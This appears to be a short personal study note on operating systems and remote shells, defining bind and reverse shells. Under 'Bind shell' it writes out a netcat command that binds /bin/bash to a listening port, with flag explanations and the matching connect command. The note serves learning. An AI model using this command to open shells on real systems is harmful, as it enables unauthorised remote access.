### .
- Operating system
### Examples
- [[Kali linux]]
- [[Windows]]
- [[ubuntu]]
### Anatomy
#### Shell
- Console like interface that provides you with access to a remote target **
--- 
#### Bind shell
- Shell connected to through **Inbound** traffic (From attacker)
- Result of [[Server-side Exploit|Server-side Attack]]
##### Commands
```
%% Creating the shell %%
nc -v -l -p [Desired Port] -e /bin/bash
```
- -v : Verbose
- -l : Listening mode
- -p : Port
- -e : Execute after connecting
- "/bin/bash" : create bash shell
```
%% Accessing shell %%
nc [IP addr] [Desired port] <commands>
```
---
#### Reverse shell
- Shell connected tot through **Outbound** traffic (From victim)
- Result of [[Client side Exploit|Client-side Attack]]